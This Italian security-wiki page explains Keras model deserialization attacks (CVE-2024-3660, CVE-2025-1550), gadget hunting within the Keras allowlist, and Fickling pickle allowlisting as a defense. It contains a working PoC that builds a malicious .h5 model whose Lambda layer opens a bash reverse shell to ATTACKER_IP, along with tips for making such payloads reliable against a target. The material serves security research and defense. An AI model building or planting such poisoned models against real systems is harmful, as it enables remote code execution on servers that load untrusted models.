# Deserializzazione di modelli Keras: RCE e ricerca di gadget

{{#include ../../banners/hacktricks-training.md}}

Questa pagina riassume le tecniche pratiche di exploitation contro la pipeline di deserializzazione dei modelli Keras, spiega gli aspetti interni e la attack surface del formato nativo `.keras` e fornisce un toolkit per i ricercatori che cercano Model File Vulnerabilities (MFVs) e gadget post-fix.

## Aspetti interni del formato del modello `.keras`

Un file `.keras` è un archivio ZIP contenente almeno:<sup>[[1]](#references)</sup>
- metadata.json – informazioni generiche (ad esempio, la versione di Keras)
- config.json – architettura del modello (attack surface principale)
- model.weights.h5 – pesi in HDF5

Il file config.json controlla la deserializzazione ricorsiva: Keras importa i moduli, risolve classi/funzioni e ricostruisce layer/oggetti a partire da dizionari controllati dall'attaccante.<sup>[[1]](#references)</sup>

Esempio di snippet per un oggetto layer Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
La deserializzazione esegue:<sup>[[1]](#references)</sup>
- Import del modulo e risoluzione dei simboli dalle chiavi module/class_name
- Invocazione di from_config(...) o del costruttore con kwargs controllati dall'attaccante
- Ricorsione negli oggetti annidati (activations, initializers, constraints, ecc.)

Storicamente, ciò esponeva tre primitive a un attaccante che creava config.json:<sup>[[1]](#references)</sup>
- Controllo dei moduli importati
- Controllo delle classi/funzioni risolte
- Controllo dei kwargs passati ai costruttori/from_config

## CVE-2024-3660 – RCE tramite bytecode del Lambda-layer

Causa principale:
- Lambda.from_config() utilizzava python_utils.func_load(...), che esegue la decodifica base64 e chiama marshal.loads() sui byte dell'attaccante; il unmarshalling di Python può eseguire codice.<sup>[[1]](#references)[[3]](#references)</sup>

Idea dell'exploit (payload semplificato in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigazione:
- Keras applica safe_mode=True per impostazione predefinita. Le funzioni Python serializzate in Lambda vengono bloccate, a meno che l'utente non scelga esplicitamente di disabilitarlo con safe_mode=False.<sup>[[1]](#references)</sup>

Note:
- I formati legacy (salvataggi HDF5 meno recenti) o i codebase più vecchi potrebbero non applicare i controlli moderni, quindi gli attacchi di tipo “downgrade” possono ancora funzionare quando le vittime utilizzano loader più vecchi.

## CVE-2025-1550 – Import arbitrario di moduli in Keras ≤ 3.8

Causa principale:
- _retrieve_class_or_fn utilizzava importlib.import_module() senza restrizioni, con stringhe di moduli controllate dall'attaccante provenienti da config.json.
- Impatto: import arbitrario di qualsiasi modulo installato (o di un modulo posizionato dall'attaccante su sys.path). Il codice eseguito al momento dell'import viene eseguito, dopodiché avviene la costruzione dell'oggetto con kwargs controllati dall'attaccante.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Idea di exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Miglioramenti della sicurezza (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: le importazioni sono limitate ai moduli ufficiali dell'ecosistema: keras, keras_hub, keras_cv, keras_nlp
- Safe mode predefinita: safe_mode=True blocca il caricamento di funzioni serializzate non sicure di Lambda
- Controllo di tipo di base: gli oggetti deserializzati devono corrispondere ai tipi previsti

## Sfruttamento pratico: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Molti stack di produzione accettano ancora file di modelli TensorFlow-Keras HDF5 legacy (.h5). Se un attacker può caricare un modello che il server carica successivamente o su cui esegue l'inferenza, un layer Lambda può eseguire Python arbitrario durante il caricamento, la compilazione o la predizione.<sup>[[7]](#references)</sup>

PoC minimale per creare un file .h5 malevolo che esegue una reverse shell durante la deserializzazione o l'utilizzo:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Note e suggerimenti per l'affidabilità:
- Punti di attivazione: il codice può essere eseguito più volte (ad esempio durante la build del layer/prima chiamata, `model.load_model` e `predict/fit`). Rendi i payload idempotenti.<sup>[[7]](#references)</sup>
- Blocco delle versioni: usa le stesse versioni di TF/Keras/Python della vittima per evitare incompatibilità nella serializzazione. Ad esempio, crea gli artifact con Python 3.8 e TensorFlow 2.13.1 se è ciò che usa il target.<sup>[[7]](#references)</sup>
- Replica rapida dell'ambiente:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validazione: un payload benigno come os.system("ping -c 1 YOUR_IP") aiuta a confermare l'esecuzione (ad esempio, osservando i pacchetti ICMP con tcpdump) prima di passare a una reverse shell.<sup>[[7]](#references)</sup>

## Superficie dei gadget dopo la correzione all'interno dell'allowlist

Anche con allowlisting e safe mode, rimane un'ampia superficie tra i callable Keras consentiti. Ad esempio, keras.utils.get_file può scaricare URL arbitrari in posizioni selezionabili dall'utente.<sup>[[1]](#references)</sup>

Gadget tramite Lambda che fa riferimento a una funzione consentita (non a bytecode Python serializzato):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Limitazione importante:
- Lambda.call() antepone il tensore di input come primo argomento posizionale quando invoca il callable di destinazione. I gadget scelti devono tollerare un argomento posizionale aggiuntivo (oppure accettare *args/**kwargs). Questo limita le funzioni utilizzabili.<sup>[[1]](#references)</sup>

## Allowlisting degli import pickle per modelli AI/ML (Fickling)

Molti formati di modelli AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, vecchi artifact TensorFlow, ecc.) incorporano dati Python pickle. Gli attacker abusano regolarmente degli import GLOBAL di pickle e dei costruttori di oggetti per ottenere RCE o sostituire il modello durante il caricamento. Gli scanner basati su blacklist spesso non rilevano import pericolosi nuovi o non presenti nell’elenco.<sup>[[8]](#references)[[14]](#references)</sup>

Una difesa pratica fail-closed consiste nell’intercettare il deserializer pickle di Python e consentire solo un set verificato di import innocui correlati al machine learning durante l’unpickling. Fickling di Trail of Bits implementa questa policy e include un allowlist curato di import ML costruito a partire da migliaia di pickle pubblici di Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Modello di sicurezza per gli import “safe” (intuizioni sintetizzate dalla ricerca e dalla pratica): i simboli importati utilizzati da un pickle devono simultaneamente:<sup>[[8]](#references)</sup>
- Non eseguire codice né causare esecuzione (nessun oggetto di codice compilato o sorgente, esecuzione di comandi shell, hook, ecc.)
- Non ottenere/impostare attributi o elementi arbitrari
- Non importare né ottenere riferimenti ad altri oggetti Python dalla VM di pickle
- Non attivare deserializer secondari (ad es. marshal, pickle annidati), neppure indirettamente

Abilita le protezioni di Fickling il prima possibile durante l’avvio del processo, in modo che qualsiasi caricamento pickle eseguito dai framework (torch.load, joblib.load, ecc.) venga verificato:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Suggerimenti operativi:
- Puoi disabilitare/riabilitare temporaneamente gli hook quando necessario:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Se un modello noto come sicuro viene bloccato, estendi l’allowlist per il tuo ambiente dopo aver esaminato i simboli:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling espone anche runtime guards generici se preferisci un controllo più granulare:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() per imporre i controlli a tutti i pickle.load()
- with fickling.check_safety(): per un enforcement limitato all'ambito
- fickling.load(path) / fickling.is_likely_safe(path) per controlli una tantum

- Quando possibile, preferisci formati di modello non basati su pickle (ad es., SafeTensors).<sup>[[15]](#references)</sup> Se devi accettare pickle, esegui i loader con il principio del privilegio minimo, senza network egress, e applica l'allowlist.

Questa strategia allowlist-first blocca in modo dimostrabile i comuni percorsi di exploit dei ML pickle, mantenendo al contempo un'elevata compatibilità. Nel benchmark di ToB, Fickling ha rilevato il 100% dei file sintetici malevoli e ha consentito circa il 99% dei file puliti provenienti dai principali repository Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit per ricercatori

1) Individuazione sistematica dei gadget nei moduli consentiti

Enumera i callable candidati in keras, keras_nlp, keras_cv, keras_hub e assegna priorità a quelli con side effect su file/network/process/env.<sup>[[1]](#references)</sup>

<details>
<summary>Enumera i callable potenzialmente pericolosi nei moduli Keras presenti nell'allowlist</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Test diretto della deserializzazione (non è necessario alcun archivio .keras)

Fornisci dizionari creati ad hoc direttamente ai deserializzatori Keras per scoprire i parametri accettati e osservare gli effetti collaterali.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Probing tra versioni e formati

Keras esiste in più codebase/ere con diversi guardrail e formati:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, destinato alla rimozione)
- tf-keras: mantenuto separatamente
- Multi-backend Keras 3 (ufficiale): ha introdotto il formato nativo .keras

Ripetere i test tra i diversi codebase e formati (.keras rispetto a HDF5 legacy) per individuare regressioni o guardrail mancanti.

## Riferimenti

- [1] [Ricerca di vulnerabilità nella deserializzazione dei modelli Keras (blog huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Aggiunti controlli alla serializzazione](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE tramite deserializzazione di Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – import arbitrario di moduli Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [report huntr – import arbitrario #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [report huntr – import arbitrario #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE Lambda di TensorFlow .h5 fino a root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [blog Trail of Bits – il nuovo scanner di file pickle AI/ML di Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – messa in sicurezza degli ambienti AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Corpus di benchmark per la scansione pickle di Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Contesto sugli attacchi Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Progetto SafeTensors](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
